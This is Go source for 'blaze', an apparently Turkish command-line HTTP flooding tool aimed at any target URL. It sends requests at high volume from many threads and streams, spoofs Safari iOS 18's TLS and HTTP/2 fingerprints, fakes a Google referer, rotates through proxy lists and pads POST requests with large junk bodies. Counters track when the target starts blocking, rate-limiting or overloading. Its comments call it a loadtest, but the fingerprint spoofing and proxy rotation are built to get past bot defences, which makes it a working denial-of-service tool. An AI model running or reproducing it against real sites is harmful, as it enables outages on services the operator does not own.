package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"runtime/debug"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	gofire "github.com/JSInvasor/Gohttp-clientfingerprintemulateandfastest"
)

const (
	white  = "\033[37m"
	gray   = "\033[38;5;245m"
	red    = "\033[31m"
	green  = "\033[32m"
	yellow = "\033[33m"
	cyan   = "\033[36m"
	reset  = "\033[0m"
)

func main() {
	if len(os.Args) >= 2 && os.Args[1] == "fp" {
		fpURL := "https://tls.peet.ws/api/all"
		if len(os.Args) >= 3 {
			fpURL = os.Args[2]
		}
		runFingerprintCheck(fpURL)
		return
	}
	if len(os.Args) < 4 {
		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy|proxy_dosya] [--body=BOYUT]")
		fmt.Println()
		fmt.Println("ornek:    ./blaze https://hedef.com 60 64 32")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 GET proxyler.txt")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 POST --body=16k")
		fmt.Println("ornek:    ./blaze fp                        (Safari iOS 18 canli JA3/JA4/H2 fingerprint)")
		os.Exit(1)
	}

	targetURL := os.Args[1]
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "https://" + targetURL
	}

	durSec := mustInt(os.Args[2], "sure")
	threads := mustInt(os.Args[3], "thread")

	streams := 32
	method := "GET"
	proxyArg := ""
	bodySize := 0

	posArgs := []string{}
	for _, arg := range os.Args[4:] {
		switch {
		case strings.HasPrefix(arg, "--body="):
			bodySize = mustBytes(strings.TrimPrefix(arg, "--body="))
		default:
			posArgs = append(posArgs, arg)
		}
	}
	if len(posArgs) >= 1 {
		streams = mustInt(posArgs[0], "stream")
	}
	if len(posArgs) >= 2 {
		method = strings.ToUpper(posArgs[1])
	}
	if len(posArgs) >= 3 {
		proxyArg = posArgs[2]
	}

	if bodySize > 0 && method == "GET" {
		method = "POST"
	}

	run(targetURL, durSec, threads, streams, method, proxyArg, bodySize)
}

// runFingerprintCheck prints Safari iOS 18's live JA3/JA4 + HTTP/2 (Akamai)
// fingerprint as observed by a fingerprint echo service, and says whether each
// one still matches the reference device.
//
// Printing the three strings alone left the operator to eyeball them against a
// value in the README, which nobody does under load — a drifted fingerprint
// then shows up as an unexplained wall of 403s instead. For the full per-layer
// diff, including header order and the HTTP/2 frames, use cmd/fpcheck.
func runFingerprintCheck(fpURL string) {
	fmt.Printf("%sfingerprint kaynagi: %s%s\n", gray, fpURL, reset)

	c, err := gofire.Emulate(gofire.SafariIOS18)
	if err != nil {
		fmt.Printf("%sSafariIOS18: emulate hatasi: %v%s\n", red, err, reset)
		return
	}
	defer c.Close()

	var body string
	var status int
	var lastErr error
	for attempt := 0; attempt < 2; attempt++ {
		ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
		resp, errReq := c.DoWithContext(ctx, "GET", fpURL, nil, nil)
		if errReq != nil {
			cancel()
			lastErr = errReq
			continue
		}
		status = resp.StatusCode()
		body, lastErr = resp.Text()
		resp.Close()
		cancel()
		if lastErr == nil && body != "" {
			break
		}
	}

	if lastErr != nil {
		fmt.Printf("%sSafariIOS18: hata (status=%d): %v%s\n", red, status, lastErr, reset)
		return
	}

	var d struct {
		TLS struct {
			JA3Hash string `json:"ja3_hash"`
			JA4     string `json:"ja4"`
		} `json:"tls"`
		HTTP2 struct {
			Akamai string `json:"akamai_fingerprint"`
		} `json:"http2"`
	}
	if errJSON := json.Unmarshal([]byte(body), &d); errJSON != nil {
		fmt.Printf("%sSafariIOS18: parse edilemedi (status=%d, len=%d): %v | ham: %.160s%s\n", red, status, len(body), errJSON, body, reset)
		return
	}
	ref := gofire.ReferenceFor(gofire.SafariIOS18)
	fmt.Printf("%sSafariIOS18%s (status=%d)  referans: %s\n", white, reset, status, ref.Device)
	drift := 0
	drift += reportFP("ja4", d.TLS.JA4, ref.JA4)
	drift += reportFP("ja3_hash", d.TLS.JA3Hash, ref.JA3Hash)
	drift += reportFP("h2", d.HTTP2.Akamai, ref.AkamaiFingerprint)
	if drift > 0 {
		fmt.Printf("%s%d fingerprint kaydi referanstan sapti — tam karsilastirma icin: go run ./cmd/fpcheck%s\n",
			red, drift, reset)
	}
}

// reportFP prints one fingerprint line and returns 1 when it drifted.
//
// An empty want means the value cannot be checked rather than that it matched —
// Chrome's JA3 is the case that matters, since it permutes extensions per
// connection by design — so it is never reported as OK.
func reportFP(name, got, want string) int {
	switch {
	case want == "":
		fmt.Printf("  %-9s %s %s(kontrol edilemiyor)%s\n", name+"=", got, gray, reset)
	case got == want:
		fmt.Printf("  %-9s %s %sOK%s\n", name+"=", got, white, reset)
	default:
		fmt.Printf("  %-9s %s %sDRIFT%s (beklenen: %s)\n", name+"=", got, red, reset, want)
		return 1
	}
	return 0
}

type clientGroup struct {
	clients   []*gofire.Client
	pipelines []*gofire.Pipeline
	templates []*http.Request
}

func (cg *clientGroup) Close() {
	for _, p := range cg.pipelines {
		p.Close()
	}
	for _, c := range cg.clients {
		c.Close()
	}
}

// classifyErr turns a raw error string into a short, actionable reason.
func classifyErr(errMsg string) string {
	lc := strings.ToLower(errMsg)
	switch {
	case strings.Contains(lc, "connect failed") || strings.Contains(lc, "connect "):
		return trimErr(errMsg, "proxy CONNECT failed: ")
	case strings.Contains(lc, "i/o timeout") || strings.Contains(lc, "deadline exceeded") || strings.Contains(lc, "timeout"):
		if strings.Contains(lc, "handshake") || strings.Contains(lc, "server hello") {
			return "tls handshake timeout (slow/dead proxy)"
		}
		return "timeout (slow/dead proxy)"
	case strings.Contains(lc, "certificate") || strings.Contains(lc, "x509"):
		return "tls cert error (MITM/transparent proxy?)"
	case strings.Contains(lc, "eof") || strings.Contains(lc, "reset") || strings.Contains(lc, "broken pipe"):
		return "tls handshake: tunnel dropped by proxy"
	case strings.Contains(lc, "server hello") || strings.Contains(lc, "handshake"):
		return trimErr(errMsg, "tls handshake: ")
	case strings.Contains(lc, "connection refused"):
		return "connection refused"
	case strings.Contains(lc, "no route to host"):
		return "no route to host (dead proxy)"
	default:
		return trimErr(errMsg, "")
	}
}

func trimErr(errMsg, prefix string) string {
	if len(errMsg) > 200 {
		errMsg = errMsg[:200] + "..."
	}
	return prefix + errMsg
}

func formatTestResult(statusCode int, err error) string {
	if err != nil {
		return fmt.Sprintf("%sImpersonate Safari iOS 18 %s>%s %s%s%s", white, gray, reset, red, classifyErr(err.Error()), reset)
	}
	return fmt.Sprintf("%sImpersonate Safari iOS 18 %s>%s %s%d%s", white, gray, reset, white, statusCode, reset)
}

// statusBucket bins status codes for live distribution display. We track the
// four codes that almost always matter for loadtesting (200 = success, 403 =
// blocked, 429 = rate-limited, 503 = origin overload) plus an "other" bucket.
type statusBucket struct {
	ok        atomic.Int64
	r403      atomic.Int64
	r429      atomic.Int64
	r503      atomic.Int64
	other     atomic.Int64
	otherCode atomic.Int32 // last seen "other" code so we can hint at it
}

func (s *statusBucket) record(code int) {
	switch {
	case code >= 200 && code < 300:
		s.ok.Add(1)
	case code == 403:
		s.r403.Add(1)
	case code == 429:
		s.r429.Add(1)
	case code == 503:
		s.r503.Add(1)
	default:
		s.other.Add(1)
		s.otherCode.Store(int32(code))
	}
}

// latencyTracker keeps a tiny lock-free histogram for p50 / p99 reporting.
// Each request samples into one of 32 power-of-two ms buckets via an atomic
// counter increment. p99 from log-scale buckets is approximate (~30% bucket
// width) but the order-of-magnitude is honest, which is what you want during
// a loadtest — exact percentiles need HDR histograms and aren't worth the
// allocations on every request.
type latencyTracker struct {
	buckets [32]atomic.Int64 // bucket i ≈ 2^i ms .. 2^(i+1) ms
}

func (lt *latencyTracker) record(d time.Duration) {
	ms := d.Milliseconds()
	if ms < 1 {
		ms = 1
	}
	b := 0
	for ms > 1 && b < 31 {
		ms >>= 1
		b++
	}
	lt.buckets[b].Add(1)
}

func (lt *latencyTracker) percentile(p float64) time.Duration {
	var total int64
	var counts [32]int64
	for i := range lt.buckets {
		c := lt.buckets[i].Load()
		counts[i] = c
		total += c
	}
	if total == 0 {
		return 0
	}
	// Nearest rank, and never rank 0.
	//
	// This truncated instead of rounding up, so total*p below 1 gave a target of
	// 0 — and `seen >= 0` is true on the first pass whether or not bucket 0 holds
	// anything. Every percentile of a small sample came back as bucket 0's 1.5ms
	// regardless of where the samples actually were: at one sample, p50 and p99
	// both reported 1.5ms for a request that took a second. It corrects itself
	// once the counts are large, which is why a live stats line hid it, but the
	// first tick of every run is exactly the small-sample case.
	//
	// Rounding up is also what nearest-rank means: of three samples the median is
	// the second, and truncation picked the first.
	target := int64(math.Ceil(float64(total) * p))
	if target < 1 {
		target = 1
	}
	var seen int64
	for i := 0; i < 32; i++ {
		seen += counts[i]
		if seen >= target {
			// Mid-bucket estimate: 2^i .. 2^(i+1) ms → return 1.5 * 2^i
			return time.Duration((int64(1)<<i)*3/2) * time.Millisecond
		}
	}
	return 0
}

func run(targetURL string, durSec, threads, streams int, method, proxyArg string, bodySize int) {
	// GOGC=500 means the GC waits until heap is 5x live size before collecting.
	// At sustained 100k+ RPS this trades a few hundred MB of heap for roughly
	// half the GC CPU time. For a short-lived loadtest the memory tradeoff is
	// trivial; the CPU saved goes straight to RPS.
	debug.SetGCPercent(500)
	_ = runtime.GOMAXPROCS(runtime.NumCPU())

	var bodyBytes []byte
	if bodySize > 0 {
		bodyBytes = make([]byte, bodySize)
		for i := range bodyBytes {
			bodyBytes[i] = 'A'
		}
		if len(bodyBytes) >= 2 {
			bodyBytes[0] = 'f'
			bodyBytes[1] = '='
		}
		fmt.Printf("%sbody modu: %s %d byte/request (origin'e buyuk paket)%s\n",
			gray, method, bodySize, reset)
	}

	totalTargetClients := threads
	if totalTargetClients < 1 {
		totalTargetClients = 1
	}

	idlePerHost := threads * streams
	if idlePerHost < 256 {
		idlePerHost = 256
	}

	usingProxy := proxyArg != ""

	reqTimeout := 10 * time.Second
	dialTO := 8 * time.Second
	tlsTO := 8 * time.Second
	if usingProxy {
		reqTimeout = 30 * time.Second
		dialTO = 15 * time.Second
		tlsTO = 15 * time.Second
	}

	baseOpts := []gofire.Option{
		gofire.WithTimeout(reqTimeout),
		gofire.WithTLSHandshakeTimeout(tlsTO),
		gofire.WithDialTimeout(dialTO),
		gofire.WithMaxIdleConnsPerHost(idlePerHost),
		gofire.WithMaxIdleConns(0),
		gofire.WithMaxConnsPerHost(0),
		gofire.WithDNSCacheTTL(30 * time.Minute),
		gofire.WithIdleConnTimeout(120 * time.Second),
		gofire.WithMaxRedirects(3),
		gofire.WithWriteBufferSize(128 * 1024),
		gofire.WithReadBufferSize(128 * 1024),
		gofire.WithMaxStreamsPerConn(50000),
		gofire.WithSocketBuffers(2*1024*1024, 2*1024*1024),
		gofire.WithWriteByteTimeout(8 * time.Second),
	}

	referer := "https://www.google.com/search?client=safari&channel=iphone_bm"

	var rotator *gofire.ProxyRotator
	proxyCount := 0
	if usingProxy {
		if isProxyFile(proxyArg) {
			pr, err := gofire.NewProxyRotatorFromFile(proxyArg)
			if err != nil {
				fmt.Fprintf(os.Stderr, "%shata: proxy dosyasi yuklenemedi: %v%s\n", red, err, reset)
				os.Exit(1)
			}
			if pr.Count() == 0 {
				fmt.Fprintf(os.Stderr, "%shata: proxy dosyasi bos%s\n", red, reset)
				os.Exit(1)
			}
			pr.SetCooldown(15 * time.Second)
			rotator = pr
			proxyCount = pr.Count()
		} else {
			baseOpts = append(baseOpts, gofire.WithProxy(proxyArg))
		}
	}

	clientBudget := totalTargetClients
	if rotator != nil {
		clientBudget = rotator.Count()
	}
	if clientBudget < 2 {
		clientBudget = 2
	}

	workersPerClient := (threads * streams) / clientBudget
	if workersPerClient < 1 {
		workersPerClient = 1
	}

	fmt.Printf("%sconfig:%s url=%s method=%s sure=%ds threads=%d streams=%d clients=%d workers/client=%d proxy=%d\n",
		gray, reset, targetURL, method, durSec, threads, streams, clientBudget, workersPerClient, proxyCount)

	cg := &clientGroup{}
	proxyIdx := 0
	for i := 0; i < clientBudget; i++ {
		clientOpts := make([]gofire.Option, 0, len(baseOpts)+2)
		clientOpts = append(clientOpts, baseOpts...)
		clientOpts = append(clientOpts, gofire.WithReferer(referer))
		c, err := gofire.Emulate(gofire.SafariIOS18, clientOpts...)
		if err != nil {
			fmt.Fprintf(os.Stderr, "%shata: client olusturulamadi: %v%s\n", red, err, reset)
			os.Exit(1)
		}
		if rotator != nil {
			c.SetProxyRotator(rotator.Pinned(proxyIdx))
			proxyIdx++
		}
		tmpl, err := c.PrepareRequest(method, targetURL)
		if err != nil {
			fmt.Fprintf(os.Stderr, "%shata: template olusturulamadi: %v%s\n", red, err, reset)
			os.Exit(1)
		}
		if bodyBytes != nil {
			attachBody(tmpl, bodyBytes, targetURL)
		}
		p := c.NewPipeline(workersPerClient)
		p.SetTemplate(tmpl)
		cg.clients = append(cg.clients, c)
		cg.pipelines = append(cg.pipelines, p)
		cg.templates = append(cg.templates, tmpl)
	}
	defer cg.Close()

	if proxyCount > 0 {
		rest := proxyCount - 1
		if rest < 0 {
			rest = 0
		}
		fmt.Printf("%s%d proxy yuklendi (test 1 proxy'i ornekliyor — geri kalan %d proxy yine de calisir)%s\n",
			gray, proxyCount, rest, reset)
	}
	testTimeout := 15 * time.Second
	if proxyCount > 0 {
		testTimeout = 30 * time.Second
	}
	{
		testCtx, testCancel := context.WithTimeout(context.Background(), testTimeout)
		resp, testErr := cg.clients[0].DoWithContext(testCtx, "GET", targetURL, nil, nil)
		testCancel()
		if testErr != nil {
			fmt.Println(formatTestResult(0, testErr))
		} else {
			fmt.Println(formatTestResult(resp.StatusCode(), nil))
			resp.Close()
		}
	}

	if bodyBytes != nil && len(cg.templates) > 0 {
		probeCtx, probeCancel := context.WithTimeout(context.Background(), testTimeout)
		resp, probeErr := cg.clients[0].FastDo(probeCtx, cg.templates[0])
		probeCancel()
		if probeErr != nil {
			fmt.Printf("%sPOST Safari iOS 18 %db %s>%s %s%s%s\n",
				white, len(bodyBytes), gray, reset, red, classifyErr(probeErr.Error()), reset)
		} else {
			fmt.Printf("%sPOST Safari iOS 18 %db %s>%s %s%d%s\n",
				white, len(bodyBytes), gray, reset, white, resp.StatusCode(), reset)
			resp.Close()
		}
	}

	// Pre-warm — 16 conns/client, all clients in parallel. Cold-start TLS
	// handshakes used to eat the first 1-2 seconds of the loadtest; this
	// front-loads them so the RPS curve climbs to peak in <1s.
	fmt.Printf("%spre-warm...%s ", gray, reset)
	warmStart := time.Now()
	warmCtx, warmCancel := context.WithTimeout(context.Background(), 15*time.Second)
	var warmWg sync.WaitGroup
	for _, c := range cg.clients {
		warmWg.Add(1)
		go func(c *gofire.Client) {
			defer warmWg.Done()
			_ = c.PreConnect(warmCtx, targetURL, 16)
		}(c)
	}
	warmWg.Wait()
	warmCancel()
	fmt.Printf("%s%v%s\n", gray, time.Since(warmStart).Round(time.Millisecond), reset)

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durSec)*time.Second)
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		cancel()
	}()

	var (
		totalSent   atomic.Int64
		totalFailed atomic.Int64
		latencySum  atomic.Int64 // ns
		errCountMap sync.Map     // map[string]*atomic.Int64
		statusDist  statusBucket
		latTracker  latencyTracker
	)

	onResult := func(resp *gofire.Response, err error, latency time.Duration) {
		totalSent.Add(1)
		latencySum.Add(int64(latency))
		latTracker.record(latency)
		if err != nil {
			totalFailed.Add(1)
			errStr := err.Error()
			if strings.Contains(errStr, "context canceled") {
				return
			}
			if len(errStr) > 200 {
				errStr = errStr[:200]
			}
			val, _ := errCountMap.LoadOrStore(errStr, &atomic.Int64{})
			val.(*atomic.Int64).Add(1)
			return
		}
		if resp != nil {
			statusDist.record(resp.StatusCode())
		}
	}

	for _, p := range cg.pipelines {
		p.OnResult = onResult
	}

	var feedWg sync.WaitGroup
	feedPipeline := func(pipeline *gofire.Pipeline) {
		defer feedWg.Done()
		for {
			select {
			case <-ctx.Done():
				return
			default:
			}
			pipeline.FireAndForget(ctx, method, targetURL, nil, nil)
		}
	}

	feedersPerPipeline := workersPerClient / 8
	if feedersPerPipeline < 4 {
		feedersPerPipeline = 4
	}
	for _, p := range cg.pipelines {
		for i := 0; i < feedersPerPipeline; i++ {
			feedWg.Add(1)
			go feedPipeline(p)
		}
	}

	startTime := time.Now()

	// Live stats: one line, refreshed every 1s. Shows current rps, peak,
	// status code distribution (200/403/429/503), p50/p99, error rate.
	statsDone := make(chan struct{})
	go func() {
		defer close(statsDone)
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		var lastSent int64
		var peakRPS int64

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				sent := totalSent.Load()
				failed := totalFailed.Load()
				elapsed := time.Since(startTime).Seconds()
				rps := sent - lastSent
				lastSent = sent
				if rps > peakRPS {
					peakRPS = rps
				}

				ok := statusDist.ok.Load()
				r403 := statusDist.r403.Load()
				r429 := statusDist.r429.Load()
				r503 := statusDist.r503.Load()
				other := statusDist.other.Load()

				p50 := latTracker.percentile(0.50)
				p99 := latTracker.percentile(0.99)

				// Colorize status counts so spike in 403/429/503 jumps out.
				okC := colorIf(ok > 0, green)
				c403 := colorIf(r403 > 0, red)
				c429 := colorIf(r429 > 0, yellow)
				c503 := colorIf(r503 > 0, red)

				errPart := ""
				if failed > 0 {
					errPart = fmt.Sprintf(" %serr:%d%s", red, failed, reset)
				}
				otherPart := ""
				if other > 0 {
					otherPart = fmt.Sprintf(" %sother(%d):%d%s", gray, statusDist.otherCode.Load(), other, reset)
				}

				fmt.Printf("\r%ssent:%d rps:%d peak:%d %.0fs%s  %s200:%d%s %s403:%d%s %s429:%d%s %s503:%d%s%s  %sp50:%v p99:%v%s%s    ",
					white, sent, rps, peakRPS, elapsed, reset,
					okC, ok, reset,
					c403, r403, reset,
					c429, r429, reset,
					c503, r503, reset,
					otherPart,
					gray, p50.Round(time.Millisecond), p99.Round(time.Millisecond), reset,
					errPart)
			}
		}
	}()

	// Error sampler: every 10s print the top 3 unique errors. Real-time
	// signal so you don't wait until the run ends to see a proxy meltdown.
	go func() {
		ticker := time.NewTicker(10 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				type ec struct {
					msg   string
					count int64
				}
				var errs []ec
				errCountMap.Range(func(k, v interface{}) bool {
					errs = append(errs, ec{k.(string), v.(*atomic.Int64).Load()})
					return true
				})
				if len(errs) == 0 {
					continue
				}
				sort.Slice(errs, func(i, j int) bool { return errs[i].count > errs[j].count })
				if len(errs) > 3 {
					errs = errs[:3]
				}
				fmt.Printf("\n%s[%s]%s ", gray, time.Now().Format("15:04:05"), reset)
				for i, e := range errs {
					if i > 0 {
						fmt.Print(gray + " | " + reset)
					}
					msg := e.msg
					if len(msg) > 60 {
						msg = msg[:60] + "..."
					}
					fmt.Printf("%s[%dx]%s %s", red, e.count, reset, msg)
				}
				fmt.Println()
			}
		}
	}()

	feedWg.Wait()
	<-statsDone
	fmt.Println()

	// Final summary — clean recap so you don't have to scroll the live log.
	elapsed := time.Since(startTime)
	sent := totalSent.Load()
	failed := totalFailed.Load()
	avgRPS := float64(sent) / elapsed.Seconds()
	avgLat := time.Duration(0)
	if sent > 0 {
		avgLat = time.Duration(latencySum.Load() / sent)
	}
	p50 := latTracker.percentile(0.50)
	p99 := latTracker.percentile(0.99)

	fmt.Println()
	fmt.Printf("%s=== ozet ===%s\n", cyan, reset)
	fmt.Printf("  sure:        %v\n", elapsed.Round(time.Millisecond))
	fmt.Printf("  toplam:      %d istek\n", sent)
	fmt.Printf("  hata:        %d (%.1f%%)\n", failed, pct(failed, sent))
	fmt.Printf("  ortRPS:      %.0f\n", avgRPS)
	fmt.Printf("  latency:     avg=%v p50=%v p99=%v\n",
		avgLat.Round(time.Millisecond),
		p50.Round(time.Millisecond),
		p99.Round(time.Millisecond))
	fmt.Printf("  status:      200=%d 403=%d 429=%d 503=%d other=%d\n",
		statusDist.ok.Load(),
		statusDist.r403.Load(),
		statusDist.r429.Load(),
		statusDist.r503.Load(),
		statusDist.other.Load())

	// Top errors with counts. Capped at 10 to keep the output sane.
	type ec struct {
		msg   string
		count int64
	}
	var errs []ec
	errCountMap.Range(func(k, v interface{}) bool {
		errs = append(errs, ec{k.(string), v.(*atomic.Int64).Load()})
		return true
	})
	if len(errs) > 0 {
		sort.Slice(errs, func(i, j int) bool { return errs[i].count > errs[j].count })
		if len(errs) > 10 {
			errs = errs[:10]
		}
		fmt.Printf("\n%s=== en sik hatalar ===%s\n", cyan, reset)
		for _, e := range errs {
			fmt.Printf("  %s[%dx]%s %s\n", red, e.count, reset, e.msg)
		}
	}
}

func pct(n, total int64) float64 {
	if total == 0 {
		return 0
	}
	return float64(n) * 100 / float64(total)
}

func colorIf(cond bool, col string) string {
	if cond {
		return col
	}
	return gray
}

func isProxyFile(s string) bool {
	if strings.Contains(s, "://") {
		return false
	}
	if _, err := os.Stat(s); err == nil {
		return true
	}
	return strings.HasSuffix(s, ".txt") || strings.HasSuffix(s, ".list") || strings.HasSuffix(s, ".csv")
}

func mustInt(s, name string) int {
	v, err := strconv.Atoi(s)
	if err != nil || v <= 0 {
		fmt.Fprintf(os.Stderr, "%shata: gecersiz %s: %s%s\n", red, name, s, reset)
		os.Exit(1)
	}
	return v
}

func mustBytes(s string) int {
	s = strings.TrimSpace(strings.ToLower(s))
	mult := 1
	switch {
	case strings.HasSuffix(s, "k"):
		mult = 1024
		s = strings.TrimSuffix(s, "k")
	case strings.HasSuffix(s, "m"):
		mult = 1024 * 1024
		s = strings.TrimSuffix(s, "m")
	}
	v, err := strconv.Atoi(s)
	if err != nil || v <= 0 {
		fmt.Fprintf(os.Stderr, "%shata: gecersiz --body boyutu: %s (ornek: --body=16k)%s\n", red, s, reset)
		os.Exit(1)
	}
	return v * mult
}

// attachBody wires a fixed body into a template request so FastDo can replay
// it. GetBody hands a fresh reader to every send (the shallow template copy
// shares one Body that would otherwise EOF after the first request).
func attachBody(tmpl *http.Request, body []byte, targetURL string) {
	tmpl.Body = io.NopCloser(bytes.NewReader(body))
	tmpl.ContentLength = int64(len(body))
	tmpl.GetBody = func() (io.ReadCloser, error) {
		return io.NopCloser(bytes.NewReader(body)), nil
	}
	tmpl.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if u, err := url.Parse(targetURL); err == nil && u.Host != "" {
		tmpl.Header.Set("Origin", u.Scheme+"://"+u.Host)
	}
}
